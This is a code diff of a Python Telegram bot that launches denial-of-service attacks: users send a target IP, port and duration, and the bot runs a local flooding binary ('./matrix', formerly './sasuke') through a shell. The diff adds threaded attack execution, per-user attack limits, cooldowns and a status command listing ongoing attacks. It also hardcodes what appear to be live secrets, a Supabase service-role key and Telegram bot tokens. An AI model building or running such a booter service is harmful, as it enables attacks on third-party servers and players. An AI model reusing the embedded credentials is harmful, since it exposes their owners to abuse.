@@ -29,7 +29,7 @@ url = "https://yxffpwhflqaapiwcpknf.supabase.co"  # Supabase project URL
 key = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl4ZmZwd2hmbHFhYXBpd2Nwa25mIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTczMjI3MzI5MywiZXhwIjoyMDQ3ODQ5MjkzfQ.WbVl0CoK25HVrFzchTnD7-AI-lPH8l_Vb1MbLQKT5NQ"  # Supabase anonymous API key
 supabase: Client = create_client(url, key)
 
-bot = telebot.TeleBot('7858493439:AAEDGY4WNmZkDHMFwwUbarXWmO3GXc8rB2s')
+bot = telebot.TeleBot('7599785141:AAG1fV-LS6r6de3ngpeWXudCZYOIAo0GnM8')
 
 # Setup timezone (IST)
 IST = pytz.timezone('Asia/Kolkata')
@@ -210,146 +210,191 @@ def show_user_id(message):
 #Store ongoing attacks globally
 ongoing_attacks = []
 
+# Store user attack tracking
+user_attacks = {}
+
+ongoing_attacks = {}  # Changed to dict to track per-user attacks
+
+class UserAttackState:
+    def __init__(self):
+        self.active_attacks = 0
+        self.cooldown_until = None
+
+    def can_attack(self):
+        current_time = datetime.now(IST)
+        
+        # If user is in cooldown, check if it's expired
+        if self.cooldown_until and current_time < self.cooldown_until:
+            return False, f"You are in cooldown. Wait until {self.cooldown_until.strftime('%H:%M:%S')}"
+        
+        # Check if user has reached attack limit
+        if self.active_attacks >= 2:
+            return False, "You already have 2 active attacks. Please wait for them to finish."
+        
+        return True, None
+
+    def start_attack(self):
+        self.active_attacks += 1
+        
+        # If this is the second attack, schedule the cooldown
+        if self.active_attacks >= 2:
+            self.schedule_cooldown()
+
+    def end_attack(self):
+        self.active_attacks = max(0, self.active_attacks - 1)
+        
+        # If all attacks are finished and cooldown was scheduled
+        if self.active_attacks == 0 and self.cooldown_until:
+            self.start_cooldown()
+
+    def schedule_cooldown(self):
+        # Schedule cooldown to start after attacks finish
+        self.cooldown_until = datetime.now(IST) + timedelta(minutes=8)
+
+    def start_cooldown(self):
+        self.cooldown_until = datetime.now(IST) + timedelta(minutes=8)
+        self.active_attacks = 0
+
+def execute_attack(message, user_id, attack_info, command):
+    try:
+        # Run attack command without capturing output - it will show in shell
+        subprocess.run(command, shell=True, capture_output=False, text=True)
+        
+        # Remove attack from ongoing list
+        if user_id in ongoing_attacks and attack_info in ongoing_attacks[user_id]:
+            ongoing_attacks[user_id].remove(attack_info)
+        
+        # Update user's attack state
+        if user_id in user_attacks:
+            user_attacks[user_id].end_attack()
+        
+        # Only send completion notification
+        bot.reply_to(message, f"BGMI Attack Finished \nBY @its_Matrix_King")
+    except Exception as e:
+        print(f"Error executing attack: {str(e)}")  # Print error to shell
+        # Ensure attack is removed from tracking on error
+        if user_id in ongoing_attacks and attack_info in ongoing_attacks[user_id]:
+            ongoing_attacks[user_id].remove(attack_info)
+        if user_id in user_attacks:
+            user_attacks[user_id].end_attack()
+
 def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
+    user_id = str(message.chat.id)
 
-    # Track the ongoing attack
-    ongoing_attacks.append({
+    if user_id not in ongoing_attacks:
+        ongoing_attacks[user_id] = []
+
+    attack_info = {
         'user': username,
         'target': target,
         'port': port,
         'time': time,
         'start_time': datetime.now(IST)
-    })
+    }
+    
+    ongoing_attacks[user_id].append(attack_info)
+
+    if user_id in user_attacks:
+        user_attacks[user_id].start_attack()
 
     response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBY @its_MATRIX_King"
     bot.reply_to(message, response)
 
-    full_command = f"./sasuke {target} {port} {time} 60"
+    full_command = f"./matrix {target} {port} {time}"
     try:
-        print(f"Executing command: {full_command}")  # Log the command
-        result = subprocess.run(full_command, shell=True, capture_output=False, text=True)
+        print(f"\nExecuting attack command: {full_command}")  # Print to shell
+        print(f"Attack started by user: {username} ({user_id})")  # Print to shell
         
-        # Remove attack from ongoing list once finished
-        ongoing_attacks.remove({
-            'user': username,
-            'target': target,
-            'port': port,
-            'time': time,
-            'start_time': ongoing_attacks[-1]['start_time']
-        })
+        # Start attack in a separate thread
+        attack_thread = threading.Thread(target=execute_attack, args=(message, user_id, attack_info, full_command))
+        attack_thread.start()
         
-        if result.returncode == 0:
-            bot.reply_to(message, f"BGMI Attack Finished \nBY @its_Matrix_King.\nOutput: {result.stdout}")
-        else:
-            bot.reply_to(message, f"Error in BGMI Attack.\nError: {result.stderr}")
     except Exception as e:
-        bot.reply_to(message, f"Exception occurred while executing the command.\n{str(e)}")
-
-        
-@bot.message_handler(commands=['status'])
-def show_status(message):
-    user_id = str(message.chat.id)
-    if user_id in admin_owner or user_id in read_users():
-        response = "Ongoing Attacks:\n\n"
-        if ongoing_attacks:
-            for attack in ongoing_attacks:
-                response += (f"User: {attack['user']}\nTarget: {attack['target']}\nPort: {attack['port']}\n"
-                             f"Time: {attack['time']} seconds\n"
-                             f"Started at: {attack['start_time'].strftime('%Y-%m-%d %H:%M:%S')}\n\n")
-        else:
-            response += "No ongoing attacks currently."
-
-        bot.reply_to(message, response)
-    else:
-        bot.reply_to(message, "You are not authorized to view the status.")
-        
-# Global dictionary to track cooldown times for users
-bgmi_cooldown = {}
+        print(f"Error starting attack: {str(e)}")  # Print to shell
+        # Clean up attack record on error
+        ongoing_attacks[user_id].remove(attack_info)
+        user_attacks[user_id].end_attack()
 
 @bot.message_handler(commands=['matrix'])
 def handle_matrix(message):
-    remove_expired_users()  # Check for expired users
+    remove_expired_users()
     user_id = str(message.chat.id)
     
     users = read_users()
     command = message.text.split()
     
-    # Initialize response to a default value
     response = "You Are Not Authorized To Use This Command.\nMADE BY @its_MATRIX_king"
 
-    # Check if the user has any ongoing attacks
-    if ongoing_attacks:
-        response = "An attack is currently in progress. Please wait until it completes before starting a new one."
-    elif user_id in admin_owner or user_id in users:
+    if user_id in admin_owner or user_id in users:
         if user_id in admin_owner:
-            # Admin owner can bypass cooldown
-            if len(command) == 4:  # Ensure proper command format (no threads argument)
+            # Admin owner can bypass attack limits and cooldown
+            if len(command) == 4:
                 try:
                     target = command[1]
-                    port = int(command[2])  # Convert port to integer
-                    time = int(command[3])  # Convert time to integer
+                    port = int(command[2])
+                    time = int(command[3])
 
                     if time > 180:
                         response = "Error: Time interval must be 180 seconds or less"
                     else:
-                        # Start the attack without setting a cooldown for admin owners
                         start_attack_reply(message, target, port, time)
-                        return  # Early return since response is handled in start_attack_reply
+                        return
                 except ValueError:
                     response = "Error: Please ensure port and time are integers."
             else:
                 response = "Usage: /matrix <target> <port> <time>"
         else:
-            # Non-admin users, check if they are within the cooldown period
-            if user_id in bgmi_cooldown:
-                cooldown_expiration = bgmi_cooldown[user_id]
-                current_time = datetime.now(pytz.timezone('Asia/Kolkata'))  # Get current time in IST
-                if current_time < cooldown_expiration:
-                    time_left = (cooldown_expiration - current_time).seconds
-                    response = f"You need to wait {time_left} seconds before using the /matrix command again."
-                else:
-                    # Cooldown has expired, proceed with the command
-                    if len(command) == 4:  # Ensure proper command format (no threads argument)
-                        try:
-                            target = command[1]
-                            port = int(command[2])  # Convert port to integer
-                            time = int(command[3])  # Convert time to integer
-
-                            if time > 180:
-                                response = "Error: Time interval must be 180 seconds or less"
-                            else:
-                                # Start the attack and set the new cooldown
-                                start_attack_reply(message, target, port, time)
-                                bgmi_cooldown[user_id] = datetime.now(pytz.timezone('Asia/Kolkata')) + timedelta(minutes=5)
-                                return  # Early return since response is handled in start_attack_reply
-                        except ValueError:
-                            response = "Error: Please ensure port and time are integers."
-                    else:
-                        response = "Usage: /matrix <target> <port> <time>"
-            else:
-                # User not in cooldown, proceed with the command
-                if len(command) == 4:  # Ensure proper command format (no threads argument)
+            # Initialize attack state for user if not exists
+            if user_id not in user_attacks:
+                user_attacks[user_id] = UserAttackState()
+            
+            # Check if user can attack
+            can_attack, error_message = user_attacks[user_id].can_attack()
+            
+            if can_attack:
+                if len(command) == 4:
                     try:
                         target = command[1]
-                        port = int(command[2])  # Convert port to integer
-                        time = int(command[3])  # Convert time to integer
+                        port = int(command[2])
+                        time = int(command[3])
 
                         if time > 180:
                             response = "Error: Time interval must be 180 seconds or less"
                         else:
-                            # Start the attack and set the new cooldown
                             start_attack_reply(message, target, port, time)
-                            bgmi_cooldown[user_id] = datetime.now(pytz.timezone('Asia/Kolkata')) + timedelta(minutes=5)
-                            return  # Early return since response is handled in start_attack_reply
+                            return
                     except ValueError:
                         response = "Error: Please ensure port and time are integers."
                 else:
                     response = "Usage: /matrix <target> <port> <time>"
+            else:
+                response = error_message
 
     bot.reply_to(message, response)
 
+@bot.message_handler(commands=['status'])
+def show_status(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_owner or user_id in read_users():
+        response = "Ongoing Attacks:\n\n"
+        
+        total_attacks = 0
+        for user_id, attacks in ongoing_attacks.items():
+            if attacks:
+                total_attacks += len(attacks)
+                for attack in attacks:
+                    response += (f"User: {attack['user']}\nTarget: {attack['target']}\n"
+                               f"Port: {attack['port']}\nTime: {attack['time']} seconds\n"
+                               f"Started at: {attack['start_time'].strftime('%Y-%m-%d %H:%M:%S')}\n\n")
+        
+        if total_attacks == 0:
+            response += "No ongoing attacks currently."
+        
+        bot.reply_to(message, response)
+    else:
+        bot.reply_to(message, "You are not authorized to view the status.")
 
 @bot.message_handler(commands=['help'])
 def show_help(message):
